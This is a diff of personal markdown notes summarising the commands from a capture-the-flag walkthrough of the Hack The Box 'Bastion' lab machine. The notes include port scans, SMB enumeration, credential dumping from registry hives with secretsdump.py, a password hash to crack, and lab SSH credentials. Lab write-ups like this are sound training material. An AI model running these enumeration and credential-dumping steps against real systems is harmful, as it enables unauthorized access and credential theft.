@@ -1,7 +1,3 @@
-Here are all the tools and commands used in 0xdf’s **HTB: Bastion** writeup, in the order they were executed:
-
----
-
 ## 🔧 **Tools Used**
 - `nmap`
 - `smbmap`
@@ -27,7 +23,7 @@ nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.134
 nmap -sC -sV -p 22,135,139,445 -oA scans/nmap-tcpscripts 10.10.10.134
 ```
 
-### 📁 SMB Enumeration
+### 📁 [SMB](SMB.md) Enumeration
 ```bash
 smbmap -H 10.10.10.134
 smbmap -H 10.10.10.134 -u df
@@ -60,7 +56,7 @@ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 # Use https://crackstation.net/ on hash 26112010952d963c8dc4217daec986d9
 ```
 
-### 💻 SSH as User
+### 💻 [SSH](SSH.md) as User
 ```bash
 ssh L4mpje@10.10.10.134
 # password: bureaulampje
